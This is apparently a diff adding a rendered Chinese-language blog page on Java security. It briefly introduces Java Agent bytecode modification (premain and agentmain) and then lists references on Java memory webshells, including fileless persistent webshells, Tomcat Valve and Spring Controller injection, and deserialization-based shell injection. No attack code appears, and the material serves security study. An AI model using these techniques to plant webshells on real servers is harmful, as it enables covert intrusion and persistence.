+<p>Java是一种静态强类型语言，在运行之前必须将其编译成<code>.class</code>字节码，然后再交给JVM处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改Java字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p>
+<p>对于Agent（代理）来讲，其大致可以分为两种，一种是在JVM启动前加载的<code>premain-Agent</code>，另一种是JVM启动之后加载的<code>agentmain-Agent</code>。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图</p>
+<p><img alt="premain-Agent" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508125.jpeg"></p>
+<p><img alt="agentmain-Agent" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508271.jpeg"></p>
+<h1 id="参考">参考：<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h1>
+<p><a href="https://www.cnblogs.com/rebeyond/p/9686213.html">【原创】利用“进程注入”实现无文件不死webshell</a></p>
+<p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p>
+<p><a href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Spring内存马 | CurlySean’s Blog</a></p>
+<p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agent实现反序列化注入内存shell</a></p>
+<p><a href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八</a></p>
+<p><a href="https://su18.org/post/memory-shell-2/">JavaWeb 内存马二周目通关攻略 | 素十八</a></p>
+<p><a href="https://www.4hou.com/posts/zlkq">Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p>
+<p><a href="https://www.freebuf.com/articles/web/433972.html">Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客</a></p>
+<p><a href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Spring型内存马分析</a></p>
+<p><a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet 简介 | 菜鸟教程</a></p>
+<p><a href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Spring内存马学习</a></p>
+<p><a href="https://xz.aliyun.com/news/11493">Spring内存马——Controller/Interceptor构造</a></p>
+<p>[基础篇 - Javassist 使用指南](<a href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> 安全/基础篇-javassist用法指南/)</p>
+<p><a href="https://goodapple.top/archives/1145#header-id-20">Java安全学习——ROME反序列化 - 枫のBlog</a> （使用Javassist缩短恶意class）</p>
+<p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agent实现反序列化注入内存shell</a></p>
+<p><a href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agent内存马 | CurlySean’s Blog</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/xvsf/tags/java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+      <li><a href="http://localhost:1313/xvsf/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/xvsf/">xvsf</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
